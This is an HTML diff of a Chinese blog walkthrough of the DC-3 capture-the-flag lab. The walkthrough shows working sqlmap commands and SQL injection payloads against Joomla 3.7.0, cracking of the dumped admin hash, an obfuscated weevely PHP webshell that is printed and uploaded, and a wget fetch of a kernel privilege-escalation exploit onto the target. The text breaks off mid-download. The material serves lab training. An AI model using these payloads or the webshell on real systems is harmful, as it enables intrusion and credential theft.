@@ -272,14 +272,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>12k</span>
+              <span>13k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>11 分钟</span>
+              <span>12 分钟</span>
             </span>
             <div class="post-description"> </div>
 
@@ -297,62 +297,88 @@
 </ul>
 <blockquote>
 <p>网段 192.168.18.0/24</p>
-<p>kali    192.168.18.131</p>
+<p>kali 192.168.18.131</p>
 <p>靶机 192.168.18.134</p>
 </blockquote>
 <p>nmap扫描网段</p>
 <blockquote>
-<p>kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn<br>Starting Nmap 7.91 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-01 11:09 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00010s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.134<br>Host is up (0.00055s latency).<br>MAC Address: 00:0C:29:83:96:86 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00033s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.01 seconds</p>
+<p>kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn Starting Nmap 7.91 (
+https://nmap.org ) at 2021-05-01 11:09 CST Nmap scan report for
+192.168.18.2 Host is up (0.00010s latency). MAC Address:
+00:50:56:E0:DA:9A (VMware) Nmap scan report for 192.168.18.134 Host is
+up (0.00055s latency). MAC Address: 00:0C:29:83:96:86 (VMware) Nmap scan
+report for 192.168.18.254 Host is up (0.00033s latency). MAC Address:
+00:50:56:E1:37:77 (VMware) Nmap scan report for 192.168.18.131 Host is
+up. Nmap done: 256 IP addresses (4 hosts up) scanned in 2.01 seconds</p>
 </blockquote>
 <p>扫描靶机开放端口</p>
 <blockquote>
-<p>kali@kali2020:~$ sudo nmap 192.168.18.134 -p- -sV<br>Starting Nmap 7.91 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-01 11:11 CST<br>Nmap scan report for 192.168.18.134<br>Host is up (0.0014s latency).<br>Not shown: 65534 closed ports<br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>MAC Address: 00:0C:29:83:96:86 (VMware)</p>
-<p>Service detection performed. Please report any incorrect results at <a target="_blank" rel="noopener" href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 14.22 seconds</p>
+<p>kali@kali2020:~$ sudo nmap 192.168.18.134 -p- -sV Starting Nmap 7.91
+( https://nmap.org ) at 2021-05-01 11:11 CST Nmap scan report for
+192.168.18.134 Host is up (0.0014s latency). Not shown: 65534 closed
+ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18
+((Ubuntu)) MAC Address: 00:0C:29:83:96:86 (VMware)</p>
+<p>Service detection performed. Please report any incorrect results at
+https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned
+in 14.22 seconds</p>
 </blockquote>
 <p>只开放了80端口</p>
 <p>dirsearch扫一下目录</p>
 <blockquote>
-<p>kali@kali2020:~/Tools/dirsearch$ sudo python3 dirsearch.py -u 192.168.18.134:80</p>
-<br>
-
+<p>kali@kali2020:~/Tools/dirsearch$ sudo python3 dirsearch.py -u
+192.168.18.134:80</p>
+<p><br></p>
 <p>扫到了管理员登录页面</p>
-<p><a target="_blank" rel="noopener" href="http://192.168.18.134/administrator/">http://192.168.18.134/administrator/</a></p>
+<p>http://192.168.18.134/administrator/</p>
 </blockquote>
 <p>打开主页有说明</p>
 <blockquote>
 <p>Welcome to DC-3.</p>
 <p>This time, there is only one flag, one entry point and no clues.</p>
-<p>To get the flag, you’ll obviously have to gain root privileges.</p>
+<p>To get the flag, you'll obviously have to gain root privileges.</p>
 <p>How you get to be root is up to you - and, obviously, the system.</p>
-<p>Good luck - and I hope you enjoy this little challenge.  :-)</p>
+<p>Good luck - and I hope you enjoy this little challenge. :-)</p>
 </blockquote>
 <p>这次只有一个flag相应得到flag就要得到root权限</p>
 <p>访问administrator页面，可以看到是Joomla搭建的平台</p>
 <p>在网上搜了下发现有一款JoomScan，安装<code>sudo git clone https://github.com/rezasp/joomscan.git</code></p>
 <blockquote>
-<p>perl joomscan.pl -u 192.168.18.134  </p>
-<p>[+] FireWall Detector<br>[++] Firewall not detected</p>
-<p>[+] Detecting Joomla Version<br>[++] Joomla 3.7.0</p>
-<p>[+] Core Joomla Vulnerability<br>[++] Target Joomla core is not vulnerable                                                     </p>
-<p>[+] Checking Directory Listing<br>[++] directory has directory listing :<br><a target="_blank" rel="noopener" href="http://192.168.18.134/administrator/components">http://192.168.18.134/administrator/components</a><br><a target="_blank" rel="noopener" href="http://192.168.18.134/administrator/modules">http://192.168.18.134/administrator/modules</a><br><a target="_blank" rel="noopener" href="http://192.168.18.134/administrator/templates">http://192.168.18.134/administrator/templates</a><br><a target="_blank" rel="noopener" href="http://192.168.18.134/images/banners">http://192.168.18.134/images/banners</a>                                                          </p>
-<p>[+] Checking apache info/status files<br>[++] Readable info/status files are not found                                                 </p>
-<p>[+] admin finder<br>[++] Admin page : <a target="_blank" rel="noopener" href="http://192.168.18.134/administrator/">http://192.168.18.134/administrator/</a>                                        </p>
-<p>[+] Checking robots.txt existing<br>[++] robots.txt is not found                                                                  </p>
-<p>[+] Finding common backup files name<br>[++] Backup files are not found                                                               </p>
-<p>[+] Finding common log files name<br>[++] error log is not found                                                                   </p>
-<p>[+] Checking sensitive config.php.x file<br>[++] Readable config files are not found                                                      </p>
-<p>Your Report : reports/192.168.18.134/                                 </p>
+<p>perl joomscan.pl -u 192.168.18.134</p>
+<p>[+] FireWall Detector [++] Firewall not detected</p>
+<p>[+] Detecting Joomla Version [++] Joomla 3.7.0</p>
+<p>[+] Core Joomla Vulnerability [++] Target Joomla core is not
+vulnerable</p>
+<p>[+] Checking Directory Listing<br>
+[++] directory has directory listing :<br>
+http://192.168.18.134/administrator/components<br>
+http://192.168.18.134/administrator/modules<br>
+http://192.168.18.134/administrator/templates<br>
+http://192.168.18.134/images/banners</p>
+<p>[+] Checking apache info/status files<br>
+[++] Readable info/status files are not found</p>
+<p>[+] admin finder<br>
+[++] Admin page : http://192.168.18.134/administrator/</p>
+<p>[+] Checking robots.txt existing<br>
+[++] robots.txt is not found</p>
+<p>[+] Finding common backup files name<br>
+[++] Backup files are not found</p>
+<p>[+] Finding common log files name<br>
+[++] error log is not found</p>
+<p>[+] Checking sensitive config.php.x file<br>
+[++] Readable config files are not found</p>
+<p>Your Report : reports/192.168.18.134/</p>
 </blockquote>
 <p>发现Joomal版本为3.7.0</p>
 <p>网上搜索相关漏洞发现存在SQL注入</p>
-<br>
-
+<p><br></p>
 <blockquote>
 <p>kali@kali2020:~/Tools$ sudo searchsploit joomla 3.7.0</p>
 <hr>
-<p> Exploit Title                                              |  Path</p>
+<p>Exploit Title | Path</p>
 <hr>
-<p>Joomla! 3.7.0 - ‘com_fields’ SQL Injection                  | php/webapps/42033.txt<br>Joomla! Component Easydiscuss &lt; 4.0.21 - Cross-Site Scripti | php/webapps/43488.txt</p>
+<p>Joomla! 3.7.0 - 'com_fields' SQL Injection | php/webapps/42033.txt
+Joomla! Component Easydiscuss &lt; 4.0.21 - Cross-Site Scripti |
+php/webapps/43488.txt</p>
 <hr>
 <p>Shellcodes: No Results</p>
 </blockquote>
@@ -361,55 +387,113 @@
 <p>#Exploit Title: Joomla 3.7.0 - Sql Injection</p>
 <p>#Date: 05-19-2017</p>
 <p>#Exploit Author: Mateus Lino</p>
-<p>#Reference: <a target="_blank" rel="noopener" href="https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html">https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</a></p>
-<p>#Vendor Homepage: <a target="_blank" rel="noopener" href="https://www.joomla.org/">https://www.joomla.org/</a></p>
+<p>#Reference:
+https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</p>
+<p>#Vendor Homepage: https://www.joomla.org/</p>
 <p>#Version: = 3.7.0</p>
 <p>#Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux</p>
 <p>#CVE : - CVE-2017-8917</p>
-<p>URL Vulnerable: <a target="_blank" rel="noopener" href="http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml%27">http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27</a></p>
-<p>Using Sqlmap: </p>
-<p>sqlmap -u “<a target="_blank" rel="noopener" href="http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> –risk=3 –level=5 –random-agent –dbs -p list[fullordering]</p>
-<p>Parameter: list[fullordering] (GET)<br>    Type: boolean-based blind<br>    Title: Boolean-based blind - Parameter replace (DUAL)<br>    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)</p>
-<p>   Type: error-based<br>   Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)<br>   Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</p>
-<p>   Type: AND/OR time-based blind<br>   Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)<br>   Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT * FROM (SEL</p>
+<p>URL Vulnerable:
+http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27</p>
+<p>Using Sqlmap:</p>
+<p>sqlmap -u
+"http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"
+--risk=3 --level=5 --random-agent --dbs -p list[fullordering]</p>
+<p>Parameter: list[fullordering] (GET) Type: boolean-based blind Title:
+Boolean-based blind - Parameter replace (DUAL) Payload:
+option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE
+WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT
+9674 FROM DUAL) END)</p>
+<p>Type: error-based Title: MySQL &gt;= 5.0 error-based - Parameter
+replace (FLOOR) Payload:
+option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT
+6600 FROM(SELECT COUNT(<em>),CONCAT(0x7171767071,(SELECT
+(ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)</em>2))x FROM
+INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</p>
+<p>Type: AND/OR time-based blind Title: MySQL &gt;= 5.0.12 time-based
+blind - Parameter replace (substraction) Payload:
+option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT
+* FROM (SEL</p>
 </blockquote>
-<br>
-
+<p><br></p>
 <p>给出了存在sql注入的url</p>
 <p><code>http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27</code></p>
 <p>sqlmap注入命令</p>
-<p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></p>
+<p><code>sqlmap -u "http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></p>
 <p>存在的sql注入类型</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Type: boolean-based blind</span><br><span class="line">Title: Boolean-based blind - Parameter replace (DUAL)</span><br><span class="line">Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END) </span><br><span class="line">Type: error-based</span><br><span class="line">Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)</span><br><span class="line">Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)  </span><br><span class="line">Type: AND/OR time-based blind</span><br><span class="line">Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)</span><br><span class="line">Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT * FROM (SEL</span><br></pre></td></tr></table></figure>
-
-<p>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> –risk=3 –random-agent –batch –dbs -p list[fullordering]</p>
+<p>sqlmap -u
+"http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"
+--risk=3 --random-agent --batch --dbs -p list[fullordering]</p>
 <p>得到数据库</p>
 <blockquote>
-<p>available databases [5]:<br>[*] information_schema<br>[*] joomladb<br>[*] mysql<br>[*] performance_schema<br>[*] sys</p>
+<p>available databases [5]: [*] information_schema [*] joomladb [*]
+mysql [*] performance_schema [*] sys</p>
 </blockquote>
 <p>查表名</p>
-<p>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> –risk=3 –random-agent –batch -D joomladb –tables -p list[fullordering]</p>
+<p>sqlmap -u
+"http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"
+--risk=3 --random-agent --batch -D joomladb --tables -p
+list[fullordering]</p>
 <blockquote>
-<p>Database: joomladb<br>[76 tables]<br>+———————+<br>| #__assets           |<br>| #__associations     |<br>| #__banner_clients   |<br>| #__banner_tracks    |<br>| #__banners          |<br>| #__bsms_admin       |<br>| #__bsms_books       |<br>| #__bsms_comments    |<br>| #__bsms_locations   |<br>| #__bsms_mediafiles  |<br>| #__bsms_message_typ |<br>| #__bsms_podcast     |<br>| #__bsms_series      |<br>| #__bsms_servers     |<br>| #__bsms_studies     |<br>| #__bsms_studytopics |<br>| #__bsms_teachers    |<br>| #__bsms_templatecod |<br>| #__bsms_templates   |<br>| #__bsms_timeset     |<br>| #__bsms_topics      |<br>| #__bsms_update      |<br>| #__categories       |<br>| #__contact_details  |<br>| #__content_frontpag |<br>| #__content_rating   |<br>| #__content_types    |<br>| #__content          |<br>| #_<em>contentitem_tag</em> |<br>| #__core_log_searche |<br>| #__extensions       |<br>| #__fields_categorie |<br>| #__fields_groups    |<br>| #__fields_values    |<br>| #__fields           |<br>| #__finder_filters   |<br>| #__finder_links_ter |<br>| #__finder_links     |<br>| #_<em>finder_taxonomy</em> |<br>| #__finder_taxonomy  |<br>| #__finder_terms_com |<br>| #__finder_terms     |<br>| #__finder_tokens_ag |<br>| #__finder_tokens    |<br>| #__finder_types     |<br>| #__jbsbackup_timese |<br>| #__jbspodcast_times |<br>| #__languages        |<br>| #__menu_types       |<br>| #__menu             |<br>| #__messages_cfg     |<br>| #__messages         |<br>| #__modules_menu     |<br>| #__modules          |<br>| #__newsfeeds        |<br>| #__overrider        |<br>| #__postinstall_mess |<br>| #__redirect_links   |<br>| #__schemas          |<br>| #__session          |<br>| #__tags             |<br>| #__template_styles  |<br>| #__ucm_base         |<br>| #__ucm_content      |<br>| #__ucm_history      |<br>| #__update_sites_ext |<br>| #__update_sites     |<br>| #__updates          |<br>| #__user_keys        |<br>| #__user_notes       |<br>| #__user_profiles    |<br>| #__user_usergroup_m |<br>| #__usergroups       |<br>| #__users            |<br>| #__utf8_conversion  |<br>| #__viewlevels       |<br>+———————+</p>
+<p>Database: joomladb [76 tables] +---------------------+ | #__assets |
+| #__associations | | #__banner_clients | | #__banner_tracks | |
+#__banners | | #__bsms_admin | | #__bsms_books | | #__bsms_comments | |
+#__bsms_locations | | #__bsms_mediafiles | | #__bsms_message_typ | |
+#__bsms_podcast | | #__bsms_series | | #__bsms_servers | |
+#__bsms_studies | | #__bsms_studytopics | | #__bsms_teachers | |
+#__bsms_templatecod | | #__bsms_templates | | #__bsms_timeset | |
+#__bsms_topics | | #__bsms_update | | #__categories | |
+#__contact_details | | #__content_frontpag | | #__content_rating | |
+#__content_types | | #__content | | #__contentitem_tag_ | |
+#__core_log_searche | | #__extensions | | #__fields_categorie | |
+#__fields_groups | | #__fields_values | | #__fields | |
+#__finder_filters | | #__finder_links_ter | | #__finder_links | |
+#__finder_taxonomy_ | | #__finder_taxonomy | | #__finder_terms_com | |
+#__finder_terms | | #__finder_tokens_ag | | #__finder_tokens | |
+#__finder_types | | #__jbsbackup_timese | | #__jbspodcast_times | |
+#__languages | | #__menu_types | | #__menu | | #__messages_cfg | |
+#__messages | | #__modules_menu | | #__modules | | #__newsfeeds | |
+#__overrider | | #__postinstall_mess | | #__redirect_links | |
+#__schemas | | #__session | | #__tags | | #__template_styles | |
+#__ucm_base | | #__ucm_content | | #__ucm_history | |
+#__update_sites_ext | | #__update_sites | | #__updates | | #__user_keys
+| | #__user_notes | | #__user_profiles | | #__user_usergroup_m | |
+#__usergroups | | #__users | | #__utf8_conversion | | #__viewlevels |
++---------------------+</p>
 </blockquote>
-<p>查字段<br>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> –risk=3 –random-agent -p list[fullordering] -D “joomladb” -T “#__users” –columns</p>
+<p>查字段 sqlmap -u
+"http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"
+--risk=3 --random-agent -p list[fullordering] -D "joomladb" -T
+"#__users" --columns</p>
 <blockquote>
-<p>Database: joomladb<br>Table: #__users<br>[6 columns]<br>+———-+————-+<br>| Column   | Type        |<br>+———-+————-+<br>| email    | non-numeric |<br>| id       | numeric     |<br>| name     | non-numeric |<br>| params   | non-numeric |<br>| password | non-numeric |<br>| username | non-numeric |<br>+———-+————-+</p>
+<p>Database: joomladb Table: #__users [6 columns]
++----------+-------------+ | Column | Type | +----------+-------------+
+| email | non-numeric | | id | numeric | | name | non-numeric | | params
+| non-numeric | | password | non-numeric | | username | non-numeric |
++----------+-------------+</p>
 </blockquote>
-<br>
-
-<p>sqlmap -u “<a target="_blank" rel="noopener" href="http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=updatexml&quot;">http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</a> –risk=3 –level=5 –random-agent -D joomladb -T “#__users” -C “username,password” –dump  -p list[fullordering]</p>
+<p><br></p>
+<p>sqlmap -u
+"http://192.168.18.134/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"
+--risk=3 --level=5 --random-agent -D joomladb -T "#__users" -C
+"username,password" --dump -p list[fullordering]</p>
 <blockquote>
-<p>Database: joomladb<br>Table: #__users<br>[1 entry]<br>+———-+————————————————————–+<br>| username | password                                                     |<br>+———-+————————————————————–+<br>| admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |<br>+———-+————————————————————–+</p>
+<p>Database: joomladb Table: #__users [1 entry]
++----------+--------------------------------------------------------------+
+| username | password |
++----------+--------------------------------------------------------------+
+| admin | $2y<span class="math inline">\(10\)</span>DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu
+|
++----------+--------------------------------------------------------------+</p>
 </blockquote>
-<br>
-
+<p><br></p>
 <p>把密码存储起来使用John爆破</p>
-<br>
-
+<p><br></p>
 <blockquote>
 <p><code>vim dc3password_hash.txt</code></p>
-<p>kali@kali2020:<del>/Tools$ cat dc3password_hash.txt<br>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu<br>kali@kali2020:</del>/Tools$ sudo john dc3password_hash.txt -show<br>?:snoopy</p>
+<p>kali@kali2020:~/Tools$ cat dc3password_hash.txt $2y<span class="math inline">\(10\)</span>DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu
+kali@kali2020:~/Tools$ sudo john dc3password_hash.txt -show ?:snoopy</p>
 </blockquote>
 <p>得到密码为snoopy</p>
 <p>去登录后台(admin,snoopy),成功登录</p>
@@ -417,8 +501,8 @@
 <p>使用kali上自带的weevely（一款webshell管理工具）</p>
 <blockquote>
 <p>kali@kali2020:~$ weevely generate pass shell.php</p>
-<p>Generated ‘shell.php’ with password ‘pass’ of 761 byte size.</p>
-<p>kali@kali2020:~$ cat shell.php<br><?php
+<p>Generated 'shell.php' with password 'pass' of 761 byte size.</p>
+<p>kali@kali2020:~$ cat shell.php <?php
 $Q='unction0/ x($t,$k){0/$0/c=strlen($k)0/;$0/l=strlen($0/t0/0/);$o="";f0/or($i=0;0/$i<$l;){for(0/$j0/0/';
 $O='"0//$kh(.+)$0/kf/0/",@fi0/le_get_co0/0/ntents("php://0/i0/nput")0/,$m)==1) {0/@ob_st0/art();@e0/va';
 $w='_e0/nd_cle0/an();$r=@base0/0/64_encode(@x(0/0/@gzc0/o0/m0/press($o),$k));pr0/int(0/"$p$kh$r$kf");}';
@@ -432,74 +516,117 @@ $R=$Z('',$X);$R();
 </blockquote>
 <p>将shell.php上传后进行连接</p>
 <blockquote>
-<p>kali@kali2020:~$ weevely <a target="_blank" rel="noopener" href="http://192.168.18.134/templates/beez3/shell.php">http://192.168.18.134/templates/beez3/shell.php</a> pass</p>
+<p>kali@kali2020:~$ weevely
+http://192.168.18.134/templates/beez3/shell.php pass</p>
 <p>[+] weevely 4.0.1</p>
-<p>[+] Target:     192.168.18.134<br>[+] Session:    /home/kali/.weevely/sessions/192.168.18.134/shell_1.session</p>
-<p>[+] Browse the filesystem or execute commands starts the connection<br>[+] to the target. Type :help for more information.</p>
-<p>weevely&gt; shell<br>sh: 1: shell: not found<br>www-data@DC-3:/var/www/html/templates/beez3 $ whoami<br>www-data<br>www-data@DC-3:/var/www/html/templates/beez3 $ </p>
-<br>
+<p>[+] Target: 192.168.18.134 [+] Session:
+/home/kali/.weevely/sessions/192.168.18.134/shell_1.session</p>
+<p>[+] Browse the filesystem or execute commands starts the connection
+[+] to the target. Type :help for more information.</p>
+<p>weevely&gt; shell sh: 1: shell: not found
+www-data@DC-3:/var/www/html/templates/beez3 $ whoami www-data
+www-data@DC-3:/var/www/html/templates/beez3 $</p>
+<p><br></p>
 </blockquote>
 <p>想办法提权</p>
 <p>查看靶机版本，发现为ubunutu16.04 内核版本为4.4.0-21</p>
 <blockquote>
-<p>www-data@DC-3:/var/www/html $ uname -a<br>Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux<br>www-data@DC-3:/var/www/html $  lsb_release -a<br>No LSB modules are available.<br>Distributor ID: Ubuntu<br>Description:    Ubuntu 16.04 LTS<br>Release:        16.04<br>Codename:       xenial</p>
+<p>www-data@DC-3:/var/www/html $ uname -a Linux DC-3 4.4.0-21-generic
+#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
+www-data@DC-3:/var/www/html $ lsb_release -a No LSB modules are
+available. Distributor ID: Ubuntu Description: Ubuntu 16.04 LTS Release:
+16.04 Codename: xenial</p>
 </blockquote>
 <p>去漏洞库找下</p>
 <blockquote>
 <p>kali@kali2020:~/Tools$ searchsploit -w ubuntu 16.04 4.4.0-21</p>
 <hr>
-<p> Exploit Title                                                                |  URL</p>
+<p>Exploit Title | URL</p>
 <hr>
-<p>Linux Kernel 4.10.5 / &lt; 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free          | <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/43234">https://www.exploit-db.com/exploits/43234</a><br>Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter ‘target_offset’ Out-of-B | <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/40049">https://www.exploit-db.com/exploits/40049</a><br>Linux Kernel 4.4.0-21 &lt; 4.4.0-51 (Ubuntu 14.04/16.04 x64) - ‘AF_PACKET’ Race  | <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/47170">https://www.exploit-db.com/exploits/47170</a><br>Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation | <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/45010">https://www.exploit-db.com/exploits/45010</a><br>Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation        | <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/44298">https://www.exploit-db.com/exploits/44298</a><br>Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - ‘netfilter target_offset’ Local  | <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/44300">https://www.exploit-db.com/exploits/44300</a><br>Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege E | <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/43418">https://www.exploit-db.com/exploits/43418</a><br>Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) | <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/47169">https://www.exploit-db.com/exploits/47169</a><br>Ubuntu &lt; 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege E | <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/41760">https://www.exploit-db.com/exploits/41760</a></p>
+<p>Linux Kernel 4.10.5 / &lt; 4.14.3 (Ubuntu) - DCCP Socket
+Use-After-Free | https://www.exploit-db.com/exploits/43234 Linux Kernel
+4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-B |
+https://www.exploit-db.com/exploits/40049 Linux Kernel 4.4.0-21 &lt;
+4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race |
+https://www.exploit-db.com/exploits/47170 Linux Kernel &lt; 4.13.9
+(Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation |
+https://www.exploit-db.com/exploits/45010 Linux Kernel &lt; 4.4.0-116
+(Ubuntu 16.04.4) - Local Privilege Escalation |
+https://www.exploit-db.com/exploits/44298 Linux Kernel &lt; 4.4.0-21
+(Ubuntu 16.04 x64) - 'netfilter target_offset' Local |
+https://www.exploit-db.com/exploits/44300 Linux Kernel &lt; 4.4.0-83 /
+&lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege E |
+https://www.exploit-db.com/exploits/43418 Linux Kernel &lt; 4.4.0/ &lt;
+4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) |
+https://www.exploit-db.com/exploits/47169 Ubuntu &lt; 15.10 - PT Chown
+Arbitrary PTs Access Via User Namespace Privilege E |
+https://www.exploit-db.com/exploits/41760</p>
 <hr>
 <p>Shellcodes: No Results</p>
 </blockquote>
-<br>
-
-<br>
-
+<p><br></p>
+<p><br></p>
 <blockquote>
-<p>www-data@DC-3:/var/www $ wget  <a target="_blank" rel="noopener" href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a><br>–2021-05-01 23:52:54–  <a target="_blank" rel="noopener" href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a><br>Resolving github.com (github.com)… 13.250.177.223<br>Connecting to github.com (github.com)|13.250.177.223|:443… connected.<br>HTTP request sent, awaiting response… 302 Found<br>Location: <a target="_blank" rel="noopener" 